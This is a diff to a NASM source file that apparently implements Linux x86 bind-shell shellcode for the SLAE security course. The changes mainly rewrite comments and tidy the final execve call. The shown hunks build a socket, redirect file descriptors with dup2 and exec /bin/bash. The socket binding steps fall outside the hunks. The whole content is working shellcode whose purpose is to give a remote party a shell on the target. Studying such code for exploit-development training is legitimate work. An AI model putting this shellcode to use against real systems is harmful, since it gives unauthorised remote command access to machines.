@@ -1,7 +1,8 @@
+
 ; Filename: bind.nasm
 ; Author:   Jake
 ; Website:  http://github.com/14deep
-; Purpose:  Bind shell shellcode for Linux x86
+; Purpose:  Bind shell shellcode for Linux x86 for the SLAE course
 
 
 global _start			
@@ -9,16 +10,15 @@ global _start
 section .text
 _start:
 
-
-;Socket Calls
-
-	;Socket
-	;In reverse order, pushing each value to the stack:
+	;Clearing the registers
 	xor eax, eax
 	xor ebx, ebx
 	xor ecx, ecx
 	xor edx, edx
 	xor esi, esi
+
+	;Socket Calls
+        ;In reverse order, pushing each value to the stack:
 
 	push eax     ; Pushing 0 for the Protocol parameter required
 	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
@@ -37,7 +37,7 @@ _start:
 
 	int 0x80     ; Interupt to call the syscall
 
-	mov edx, eax ; Moving the File Descriptor to edx
+	mov edx, eax ; Moving the File Descriptor return value to edx
 
 
 
@@ -113,7 +113,7 @@ _start:
 	
 
 	;dup2
-	;This could be looped
+	;This could be looped if required
 
 	mov al, 0x3f  ; Syscall for dup2
 	mov ebx, edx  ; Moving the old FD into ebx
@@ -133,22 +133,21 @@ _start:
 	;execve
 
     	xor eax, eax
-    	push eax ; for edx?
+    	push eax      ; Pushing 0 to the stack
 
-   	; push////bin/bash (12)
+   	; push////bin/bash (12), could be shortened to //bin/sh (8)
     	push 0x68736162
    	push 0x2f6e6962
     	push 0x2f2f2f2f
 
-    	mov ebx, esp ; move these into ebx as required
+    	mov ebx, esp ; move stack pointer pointing to the above to ebx as a parameter (filename)
+	
+	xor ecx, ecx ; Null pointer for ecx argv
+	xor edx, edx ; Null pointer for edx envp
 
-   	push eax ; xor'd to be 0 pushed onto stack
-    	mov edx, esp
+    	mov al, 0xb   ; Moving 11 to eax for execve syscall
+    	int 0x80     ; Interupt to call the syscall
 
-    	push ebx
-    	mov ecx, esp
 
-    	mov al, 11
-    	int 0x80
 
 
